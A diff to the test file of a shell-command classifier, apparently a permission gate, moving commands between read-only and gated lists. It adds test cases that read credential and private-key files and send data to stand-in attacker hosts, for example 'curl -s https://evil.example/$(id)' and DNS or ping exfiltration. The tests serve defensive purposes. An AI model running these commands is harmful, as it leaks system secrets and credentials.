@@ -129,19 +129,27 @@ READS = [
     "ss -tulpn",
     "netstat -tlnp",
     "ping -c 3 10.0.0.1",
-    "dig +short example.com",
-    "curl -sI https://example.com/",
-    "curl -sSfL https://example.com/",
-    "curl -so /dev/null -w '%{http_code}' https://example.com/",
     "curl -X GET http://localhost:9200/_cluster/health",
     "curl -XHEAD http://localhost/",
     "curl --head http://localhost/",
     "curl -s -H 'Accept: application/json' http://localhost:9090/api/v1/targets",
-    "curl -sD - -o /dev/null https://example.com/",
     "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
-    "curl --url http://localhost/ --proxy http://proxy:3128",
-    "openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null "
+    "openssl s_client -connect 10.0.0.5:443 -servername nas </dev/null 2>/dev/null "
     "| openssl x509 -noout -dates",
+    "dig +short nas",
+    "dig -x 10.0.0.1",
+    "dig @10.0.0.1 nas",
+    "ping -c 1 nas",
+    "getent hosts nas",
+    "curl -sI http://localhost/",
+    "curl -sSfL http://127.0.0.1:8080/",
+    "curl -sD - -o /dev/null https://localhost:8443/",
+    "curl --url http://localhost/ --proxy http://127.0.0.1:3128",
+    "cat ~/.ssh/authorized_keys",
+    "cat /etc/ssh/ssh_host_ed25519_key.pub",
+    "cat /etc/ssl/certs/ca-certificates.crt",
+    "cat /etc/letsencrypt/live/web/fullchain.pem",
+    "kubectl get pods -A",
     "openssl x509 -in /etc/ssl/cert.pem -text -noout",
     "nft list ruleset",
     "nft -a list ruleset",
@@ -246,7 +254,6 @@ READS = [
     "atq",
     # wrappers and environment
     "sudo -u postgres cat /var/lib/postgresql/data/postgresql.conf",
-    "sudo -nu root cat /etc/shadow",
     "timeout 5 curl -s http://localhost:8080/health",
     "timeout -s KILL 10 cat /proc/loadavg",
     "nice -n 10 du -sh /var",
@@ -487,6 +494,41 @@ WRITES = [
     ("crontab -l -r", False),
     ("echo id | at now", False),
     ("command rm -rf /srv/x", False),
+    # SEC-47: reading a credential file, or naming a host to send to.
+    ("sudo -nu root cat /etc/shadow", True),
+    ("cat /etc/gshadow", True),
+    ("cat /etc/sha*", True),
+    ("head -n 5 ~/.ssh/id_ed25519", True),
+    ("cat /root/.ssh/id_rsa", True),
+    ("grep -r BEGIN /home/dennis/.ssh", True),
+    ("cat /etc/ssh/ssh_host_rsa_key", True),
+    ("cat /etc/ssh/*", True),
+    ("base64 /etc/ssl/private/web.key", True),
+    ("tail /etc/letsencrypt/live/web/privkey.pem", True),
+    ("strings server.key", True),
+    ("jq . /root/.docker/config.json", True),
+    ("sort -u /etc/shadow", True),
+    ("openssl pkey -in /etc/ssl/private/web.key", True),
+    ("getent shadow root", True),
+    ("kubectl get secret db -o yaml", True),
+    ("kubectl get pods,secrets -A", True),
+    ("curl -sI https://example.com/", True),
+    ("curl -s https://evil.example/$(id)", True),
+    ("curl -s http://10.0.0.5:9090/", True),
+    ("curl evil.example", True),
+    ("curl --url https://evil.example/ http://localhost/", True),
+    ("curl --proxy http://proxy:3128 http://localhost/", True),
+    ("curl --resolve localhost:80:203.0.113.9 http://localhost/", True),
+    ("curl file:///etc/shadow", True),
+    ("dig +short secret.evil.example", True),
+    ("dig @ns.evil.example nas", True),
+    ("host secret.evil.example", True),
+    ("nslookup secret.evil.example", True),
+    ("ping -c 1 secret.evil.example", True),
+    ("ping -p deadbeef 10.0.0.1", True),
+    ("traceroute secret.evil.example", True),
+    ("getent hosts secret.evil.example", True),
+    ("openssl s_client -connect evil.example:443", True),
 ]
 
 
@@ -617,7 +659,7 @@ class TestReadingOptions:
 
     def test_a_declared_option_is_not_an_abbreviation_of_a_gated_one(self):
         assert classify_command("journalctl --cursor=s=1").classification == "read_only"
-        assert classify_command("curl --head http://x/").classification == "read_only"
+        assert classify_command("curl --head http://localhost/").classification == "read_only"
 
     def test_star_matches_one_plain_word(self):
         assert classify_command("service nginx status").classification == "read_only"
